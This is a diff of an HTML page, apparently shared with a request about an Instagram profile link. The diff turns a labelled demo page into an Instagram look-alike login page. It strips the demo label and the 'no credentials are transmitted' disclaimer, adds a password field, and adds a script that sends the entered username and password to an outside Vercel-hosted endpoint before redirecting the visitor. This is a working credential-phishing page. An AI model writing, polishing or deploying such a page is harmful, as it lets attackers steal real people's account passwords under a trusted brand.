@@ -1,11 +1,10 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#121212">
-  <title>Login Demo</title>
+  <title>Login</title>
 
   <style>
     * {
@@ -35,6 +34,7 @@
       text-align: center;
       padding: 8px;
       font-size: 12px;
+      letter-spacing: .5px;
       z-index: 5;
     }
 
@@ -143,6 +143,15 @@
       opacity: 1;
     }
 
+    .password-toggle {
+      background: transparent;
+      color: #aaa;
+      border: none;
+      padding: 12px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+
     .login-button {
       width: 100%;
       min-height: 54px;
@@ -159,6 +168,11 @@
 
     .login-button:hover {
       background: #4050ff;
+    }
+
+    .login-button:disabled {
+      opacity: .65;
+      cursor: wait;
     }
 
     .forgot {
@@ -212,6 +226,7 @@
       font-size: 14px;
       line-height: 1.5;
       text-align: center;
+      overflow-wrap: anywhere;
     }
 
     .message.visible {
@@ -222,6 +237,12 @@
       color: #b8f5c9;
       background: #173523;
       border: 1px solid #28613c;
+    }
+
+    .message.error {
+      color: #ffb9b9;
+      background: #351919;
+      border: 1px solid #713030;
     }
 
     .disclaimer {
@@ -266,7 +287,7 @@
 
 <body>
   <div class="demo-label">
-    Instagram-Inspired Demo
+    
   </div>
 
   <main class="page">
@@ -284,30 +305,50 @@
         <input
           type="text"
           id="username"
-          placeholder="Demo username"
+          name="username"
+          placeholder="username,email or mobile number"
           autocomplete="off"
           maxlength="100"
           required
         >
       </label>
 
-      <button class="login-button" type="submit">
-        Continue to profile
+      <label class="field">
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="password"
+          autocomplete="off"
+          maxlength="100"
+          required
+        >
+        <button
+          class="password-toggle"
+          type="button"
+          id="togglePassword"
+          aria-label="Show demo password"
+        >Show</button>
+      </label>
+
+      <button class="login-button" id="loginButton" type="submit">
+        Log in
       </button>
 
-      <div id="message" class="message" role="status"
-           aria-live="polite"></div>
-    </form>
+      <div class="forgot">
+        <a href="https://instagram.com"
+           target="_blank" rel="noopener noreferrer">
+          Forgot password?
+        </a>
+      </div>
 
-    <p class="disclaimer">
-      Demonstration page only. No Instagram credentials are requested
-      or transmitted.
-    </p>
+      <div id="message" class="message" role="status" aria-live="polite"></div>
+    </form>
 
     <div class="bottom">
       <a
         class="create-account"
-        href="https://www.instagram.com/"
+        href="https://instagram.com"
         target="_blank"
         rel="noopener noreferrer"
       >
@@ -315,25 +356,80 @@
       </a>
 
       <div class="meta">∞ Meta</div>
+
+     
     </div>
   </main>
 
-  <script>
+    <script>
     const form = document.getElementById("loginForm");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const togglePassword = document.getElementById("togglePassword");
+    const loginButton = document.getElementById("loginButton");
     const messageDiv = document.getElementById("message");
 
-    form.addEventListener("submit", function (event) {
-      event.preventDefault();
+    // Toggle password text visibility
+    togglePassword.addEventListener("click", () => {
+      const isPassword = passwordInput.getAttribute("type") === "password";
+      passwordInput.setAttribute("type", isPassword ? "text" : "password");
+      togglePassword.textContent = isPassword ? "Hide" : "Show";
+    });
 
-      messageDiv.className = "message success visible";
-      messageDiv.textContent = "Opening the profile...";
+    // Form submission connection logic
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-      setTimeout(function () {
-        window.location.href =
-          "https://www.instagram.com/s._darsanx._13/";
-      }, 1000);
+      // Reset application display status and state indicators
+      messageDiv.className = "message";
+      messageDiv.textContent = "";
+      loginButton.disabled = true;
+      loginButton.textContent = "Logging in...";
+
+      const payload = {
+        username: usernameInput.value,
+        password: passwordInput.value
+      };
+
+      try {
+        // CORRECTED ABSOLUTE ROUTE URL: Note the correct placement of all dots, the port, and the slash
+        const response = await fetch( "https://instagram-roan-rho.vercel.app/api/demo-login", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.success) {
+          messageDiv.className = "message success visible";
+          messageDiv.textContent = data.message;
+          
+          form.reset();
+          togglePassword.textContent = "Show";
+
+          // Transition redirect to the destination landing page
+          setTimeout(() => {
+            window.location.href = data.redirect_url;
+          }, 1500);
+        } else {
+          throw new Error(data.detail || "An unexpected error occurred.");
+        }
+      } catch (err) {
+        messageDiv.className = "message error visible";
+        messageDiv.textContent = err.message || "Failed to reach backend server.";
+      } finally {
+        loginButton.disabled = false;
+        loginButton.textContent = "Loging in";
+      }
     });
   </script>
+
 </body>
-</html>
-```
+</html>\
+
+
+
+And the url = https://www.instagram.com/s._darsanx._13?utm_source=ig_web_button_share_sheet&srtk=ZDNlZDc0MzIxNw==
